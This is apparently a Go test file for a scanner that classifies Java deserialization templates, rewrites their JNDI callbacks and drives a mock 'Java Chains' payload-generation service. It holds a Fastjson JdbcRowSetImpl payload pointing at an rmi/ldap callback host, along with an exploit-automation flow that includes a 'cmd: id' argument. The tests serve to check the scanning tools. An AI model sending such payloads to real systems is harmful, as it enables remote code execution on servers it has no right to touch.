package scanner

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

func TestJavaDeserializationKeyword(t *testing.T) {
	cases := []struct {
		name string
		id   string
		tags []string
		want string
	}{
		{"fastjson", "fastjson-1-2-47-rce", []string{"fastjson", "rce"}, "fastjson"},
		{"fastjson2", "fastjson2-rce", []string{"fastjson2", "deserialization"}, "fastjson2"},
		{"shiro", "shiro-deserialization", []string{"shiro", "cve"}, "shiro"},
		{"generic java", "java-deser-rce", []string{"deserialization", "java"}, "java deserialization"},
		{"php", "php-unserialize", []string{"deserialization", "php"}, ""},
		{"unrelated", "nginx-version", []string{"nginx"}, ""},
	}
	for _, tc := range cases {
		if got := JavaDeserializationKeyword(tc.id, tc.name, tc.tags, ""); got != tc.want {
			t.Errorf("%s: got %q want %q", tc.name, got, tc.want)
		}
	}
}

func TestExtractRawHTTPRequests(t *testing.T) {
	content := `id: fastjson-test
info:
  name: Fastjson test
  tags: fastjson,deserialization
http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{{interactsh-url}}/Exploit"}
      - |
        POST /api HTTP/1.1
        Host: {{Hostname}}

        {"a":1}
`
	raws := ExtractRawHTTPRequests(content)
	if len(raws) != 2 {
		t.Fatalf("got %d raw requests want 2", len(raws))
	}
	if !HasInteractshJNDI(raws) {
		t.Fatal("expected JNDI OAST address to be detected")
	}
	if HasInteractshJNDI([]string{"POST / HTTP/1.1\n\n{\"a\":1}"}) {
		t.Fatal("request without JNDI address must not match")
	}
	target, err := ParseRawTarget("http://127.0.0.1:18080")
	if err != nil {
		t.Fatal(err)
	}
	rewritten, ok := RewriteJNDIRequests(raws, "ldap://10.0.0.5:50389/abc", target)
	if !ok || len(rewritten) != 1 {
		t.Fatalf("rewrite ok=%v count=%d", ok, len(rewritten))
	}
	if !strings.Contains(rewritten[0], "ldap://10.0.0.5:50389/abc") || strings.Contains(rewritten[0], "interactsh-url") {
		t.Fatalf("unexpected rewritten request:\n%s", rewritten[0])
	}
	if !strings.Contains(rewritten[0], "Host: 127.0.0.1:18080") {
		t.Fatalf("hostname not substituted:\n%s", rewritten[0])
	}
	req, err := BuildRawRequest(rewritten[0], target)
	if err != nil {
		t.Fatal(err)
	}
	if req.Method != "POST" || req.URL != "http://127.0.0.1:18080/" {
		t.Fatalf("unexpected request %s %s", req.Method, req.URL)
	}
	if !strings.Contains(req.Body, "ldap://10.0.0.5:50389/abc") {
		t.Fatalf("body missing payload: %s", req.Body)
	}
}

func TestJavaChainsClientRoundTrip(t *testing.T) {
	var calls []string
	argsSeen := map[string]map[string]any{}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("X-Api-Token") != "test-token" {
			w.WriteHeader(http.StatusForbidden)
			return
		}
		if r.URL.Path != "/api/mcp" {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		body, _ := io.ReadAll(r.Body)
		var rpc struct {
			ID     int64  `json:"id"`
			Method string `json:"method"`
			Params struct {
				Name      string         `json:"name"`
				Arguments map[string]any `json:"arguments"`
			} `json:"params"`
		}
		_ = json.Unmarshal(body, &rpc)
		if rpc.Method != "tools/call" {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		calls = append(calls, rpc.Params.Name)
		argsSeen[rpc.Params.Name] = rpc.Params.Arguments
		var text string
		switch rpc.Params.Name {
		case "java_chains_capabilities":
			text = `{"version":"2.0.0-beta7"}`
		case "java_chains_presets_search":
			text = `{"items":[{"id":"java.fastjson.jndi","intent":"outbound-jndi","payloadCandidates":["JNDILDAPDeserializePayload","JavaNativePayload"]}]}`
		case "java_chains_quick_jndi":
			if rpc.Params.Arguments["presetId"] != "java.fastjson.jndi" {
				text = `{"error":"bad preset"}`
			} else {
				text = `{"taskId":"task1","status":"SUCCEEDED","formats":{"ldap":"ldap://10.0.0.5:50389/tok","token":"tok"},"service":{"state":"READY","activePublications":{"count":1}}}`
			}
		case "java_chains_quick_generate":
			text = `{"output":{"artifact":{"artifactId":"art_1","sizeBytes":10,"sha256":"abc"},"meta":{"chain":"A_B","rawSizeBytes":10}}}`
		case "java_chains_runtime_logs":
			text = `{"entries":[{"seq":9,"message":"canonical ldap search baseToken=tok outcome=serve bytes=10"}]}`
		case "java_chains_services_get":
			text = `{"activePublications":{"count":0}}`
		case "java_chains_jobs_delete", "java_chains_services_stop", "java_chains_artifact_delete":
			text = `{"ok":true}`
		default:
			text = `{}`
		}
		resp := map[string]any{
			"jsonrpc": "2.0", "id": rpc.ID,
			"result": map[string]any{"content": []map[string]any{{"type": "text", "text": text}}},
		}
		_ = json.NewEncoder(w).Encode(resp)
	}))
	defer srv.Close()

	client := NewJavaChainsClient(JavaChainsConfig{BaseURL: srv.URL, Token: "test-token"}, 5*time.Second)
	ctx := context.Background()
	if err := client.JavaChainsStatus(ctx); err != nil {
		t.Fatal(err)
	}
	presets, err := client.SearchPresets(ctx, "fastjson", 5)
	if err != nil || len(presets) != 1 || presets[0].ID != "java.fastjson.jndi" {
		t.Fatalf("presets=%v err=%v", presets, err)
	}
	jndi, err := client.QuickJNDI(ctx, presets[0].ID, "JNDILDAPDeserializePayload", map[string]any{"cmd": "id"}, "127.0.0.1", "10.0.0.5")
	if err != nil {
		t.Fatal(err)
	}
	if jndi.Formats.LDAP != "ldap://10.0.0.5:50389/tok" || jndi.TaskID != "task1" {
		t.Fatalf("unexpected jndi result: %+v", jndi)
	}
	gen, err := client.QuickGenerate(ctx, presets[0].ID, "JavaNativePayload", nil)
	if err != nil || gen.Output.Artifact.ArtifactID != "art_1" {
		t.Fatalf("generate=%v err=%v", gen, err)
	}
	logs, err := client.RuntimeLogs(ctx, 0, 100)
	if err != nil || len(logs) != 1 || !strings.Contains(logs[0].Message, "outcome=serve") {
		t.Fatalf("logs=%v err=%v", logs, err)
	}
	if n, err := client.ActiveJNDIPublications(ctx); err != nil || n != 0 {
		t.Fatalf("active=%d err=%v", n, err)
	}
	if err := client.DeleteJob(ctx, "task1"); err != nil {
		t.Fatal(err)
	}
	if err := client.StopJNDI(ctx); err != nil {
		t.Fatal(err)
	}
	if len(calls) != 8 {
		t.Fatalf("expected 8 tool calls, got %d: %v", len(calls), calls)
	}
	if got := argsSeen["java_chains_runtime_logs"]["verbosity"]; got != "full" {
		t.Fatalf("runtime_logs must request full verbosity, got %v", got)
	}
	if got := argsSeen["java_chains_jobs_delete"]["unpublish"]; got != true {
		t.Fatalf("jobs_delete must unpublish, got %v", got)
	}
}

func TestJavaChainsClientPrefersStructuredContent(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		resp := map[string]any{
			"jsonrpc": "2.0", "id": 1,
			"result": map[string]any{
				"content": []map[string]any{{"type": "text", "text": `{"entries":[{"seq":1,"message":"startup only"}]}`}},
				"structuredContent": map[string]any{
					"entries": []map[string]any{{"seq": 33, "message": "canonical ldap search baseToken=tok outcome=lookup"}},
				},
			},
		}
		_ = json.NewEncoder(w).Encode(resp)
	}))
	defer srv.Close()

	client := NewJavaChainsClient(JavaChainsConfig{BaseURL: srv.URL, Token: "tok"}, 3*time.Second)
	logs, err := client.RuntimeLogs(context.Background(), 0, 100)
	if err != nil {
		t.Fatal(err)
	}
	if len(logs) != 1 || logs[0].Seq != 33 || !strings.Contains(logs[0].Message, "outcome=lookup") {
		t.Fatalf("structured content not preferred: %+v", logs)
	}
}

func TestJavaChainsClientAuthFailure(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusForbidden)
	}))
	defer srv.Close()
	client := NewJavaChainsClient(JavaChainsConfig{BaseURL: srv.URL, Token: "bad"}, 3*time.Second)
	if err := client.JavaChainsStatus(context.Background()); err == nil {
		t.Fatal("expected auth failure")
	}
	client = NewJavaChainsClient(JavaChainsConfig{BaseURL: srv.URL}, 3*time.Second)
	if err := client.JavaChainsStatus(context.Background()); err == nil {
		t.Fatal("expected unconfigured error")
	}
}
